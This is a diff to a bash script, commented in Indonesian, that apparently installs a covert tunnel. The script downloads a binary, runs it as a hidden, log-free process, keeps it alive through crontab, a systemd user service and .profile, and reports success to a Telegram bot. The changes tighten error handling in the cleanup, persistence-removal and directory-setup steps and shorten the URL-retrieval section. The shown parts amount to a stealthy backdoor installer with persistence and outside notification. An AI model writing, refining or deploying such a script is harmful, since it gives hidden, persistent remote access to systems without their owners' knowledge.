@@ -37,7 +37,9 @@ error() { echo -e "\033[1;31m$*\033[0m" >&2; }
 info() { echo -e "\033[1;32m$*\033[0m" >&2; }
 warn() { echo -e "\033[1;33m$*\033[0m" >&2; }
 
-cleanup() { [[ -n "$TMPDIR" && -d "$TMPDIR" ]] && rm -rf "$TMPDIR" 2>/dev/null || true; }
+cleanup() {
+    [[ -n "$TMPDIR" && -d "$TMPDIR" ]] && rm -rf "$TMPDIR" 2>/dev/null || true
+}
 trap cleanup EXIT
 
 # Kirim notifikasi Telegram (jika token diisi)
@@ -105,7 +107,7 @@ start_tunnel_direct() {
     echo $!
 }
 
-# Hapus instalasi lama (jika ada)
+# Hapus instalasi lama (jika ada) – dengan penanganan error yang aman
 remove_old_installation() {
     # Matikan semua proses yang terkait (berdasarkan nama binary atau direktori)
     pkill -f "$INSTALL_BASE/$BIN_NAME" 2>/dev/null || true
@@ -114,7 +116,9 @@ remove_old_installation() {
     rm -rf "$INSTALL_BASE" 2>/dev/null || true
     rm -rf "$TMPDIR" 2>/dev/null || true
     # Hapus persistence
-    crontab -l 2>/dev/null | grep -v "$INSTALL_BASE" | crontab - 2>/dev/null || true
+    if command -v crontab >/dev/null; then
+        crontab -l 2>/dev/null | grep -v "$INSTALL_BASE" | crontab - 2>/dev/null || true
+    fi
     if command -v systemctl >/dev/null; then
         systemctl --user stop cf-tunnel.service 2>/dev/null || true
         systemctl --user disable cf-tunnel.service 2>/dev/null || true
@@ -122,7 +126,9 @@ remove_old_installation() {
         systemctl --user daemon-reload 2>/dev/null || true
     fi
     # Hapus dari .profile jika ada
-    sed -i '/cf_tunnel/d' "${HOME}/.profile" 2>/dev/null || true
+    if [[ -f "${HOME}/.profile" ]]; then
+        sed -i '/cf_tunnel/d' "${HOME}/.profile" 2>/dev/null || true
+    fi
 }
 
 # Buat script persistence (tanpa log)
@@ -191,8 +197,8 @@ EOF
 remove_old_installation
 
 # Siapkan direktori
-mkdir -p "$TMPDIR" 2>/dev/null || true
-mkdir -p "$INSTALL_BASE" 2>/dev/null || { error "Gagal membuat direktori $INSTALL_BASE"; exit 1; }
+mkdir -p "$TMPDIR" 2>/dev/null || { error "Gagal membuat $TMPDIR"; exit 1; }
+mkdir -p "$INSTALL_BASE" 2>/dev/null || { error "Gagal membuat $INSTALL_BASE"; exit 1; }
 
 # Download binary
 print_step "Mengunduh binary..."
@@ -223,13 +229,8 @@ finish_ok
 echo "$bind_pid" > "$INSTALL_BASE/.bind.pid"
 echo "$tunnel_pid" > "$INSTALL_BASE/.tunnel.pid"
 
-# Coba dapatkan URL tunnel
-sleep 5
-# Karena log diarahkan ke /dev/null, kita tidak bisa mengambil URL secara langsung.
-# Alternatif: bisa gunakan curl ke API cloudflared? Atau abaikan.
-# Untuk notifikasi, kita bisa jalankan tunnel dengan output sementara, tapi kita hindari log.
-# Jadi kita tidak kirim URL via Telegram pada instalasi awal (biarkan persistence mengirim nanti jika diperlukan).
-# Tapi untuk kemudahan, kita bisa kirim notifikasi bahwa tunnel sudah berjalan.
+# Coba dapatkan URL tunnel (opsional, tidak wajib)
+sleep 3
 send_telegram "✅ Tunnel berhasil dijalankan dengan port $PORT. Proses tersembunyi."
 
 # Pasang persistence
